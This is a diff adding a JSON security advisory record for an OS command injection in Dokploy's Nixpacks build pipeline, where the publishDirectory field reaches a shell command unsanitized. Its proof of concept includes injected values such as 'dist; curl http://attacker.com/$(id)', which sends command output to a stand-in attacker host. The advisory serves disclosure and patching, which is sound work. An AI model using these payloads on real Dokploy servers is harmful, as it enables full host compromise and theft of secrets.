@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-98j8-6vjr-c3xw",
+  "aliases": [],
+  "title": "OS Command Injection via unsanitized publishDirectory in Nixpacks build pipeline",
+  "summary": "Description:\r\n  ### Summary\r\n  An authenticated user can set the `publishDirectory` field to a value containing shell metacharacters (e.g., `dist;\r\n  curl http://attacker.com/$(id)`). When a Nixpacks deployment is triggered, this value is interpolated directly into a\r\n  shell command executed via `child_process.exec()`, resulting in arbitrary command execution on the host server.\r\n\r\n  ### Details\r\n  The vulnerable field is defined in `packages/server/src/db/schema/application.ts`:\r\n\r\n  ```typescript\r\n  export const apiSaveBuildType = createSchema\r\n    .pick({ applicationId: true, buildType: true, ... })\r\n    .merge(createSchema.pick({ publishDirectory: true, isStaticSpa: true }))\r\n\r\n  publishDirectory accepts any string with no character validation (z.string().optional()).\r\n\r\n  During Nixpacks deployment, packages/server/src/utils/builders/nixpacks.ts constructs the following shell command:\r\n\r\n  await execAsync(\r\n    `docker cp ${buildContainerId}:/app/${publishDirectory}${isDirectory ? \"/.\" : \"\"} ${path.join(buildAppDirectory,\r\n  publishDirectory)}`\r\n  )\r\n\r\n  execAsync is implemented using child_process.exec() (util.promisify(exec)), which spawns a shell and interprets\r\n  metacharacters such as ;, |, &&, $(), and backticks.\r\n\r\n  The field is set via the saveBuildType tRPC procedure in apps/dokploy/server/api/routers/application.ts, which only\r\n  requires create permission on the application - a standard user privilege.\r\n\r\n  PoC\r\n\r\n  1. Log in to a Dokploy instance and create a project + application\r\n  2. Go to the application's Build settings\r\n  3. Set Build Type to Nixpacks\r\n  4. Set Publish Directory to:\r\n  dist; curl http://<attacker-controlled-host>/$(id)\r\n  5. Save and trigger a deployment\r\n  6. The server makes an outbound request to the attacker's host with the output of id (e.g., uid=0(root))\r\n\r\n  To confirm without a live listener, set Publish Directory to:\r\n  dist; id > /tmp/pwned_by_dokploy\r\n  After deployment, verify /tmp/pwned_by_dokploy exists on the host with command output.\r\n\r\n  Impact\r\n\r\n  Any authenticated user with access to an application can execute arbitrary OS commands on the Dokploy host server.\r\n  Since Dokploy requires access to the Docker socket (equivalent to root), this results in full host compromise -\r\n  including reading secrets, modifying containers, and lateral movement to all managed services",
+  "published_at": "2026-11-12T08:17:45.000Z",
+  "modified_at": "2026-11-12T08:17:45.000Z",
+  "severity": {
+    "level": "critical",
+    "score": 9.9,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-78"
+  ],
+  "affected": [
+    {
+      "product": "dokploy",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "0.31.1"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-98j8-6vjr-c3xw",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-98j8-6vjr-c3xw",
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-98j8-6vjr-c3xw",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:1070f40e026def1b060677616a46bba3ef4fe6f1264f7bc538631bab2f64ce97",
+  "note": null
+}
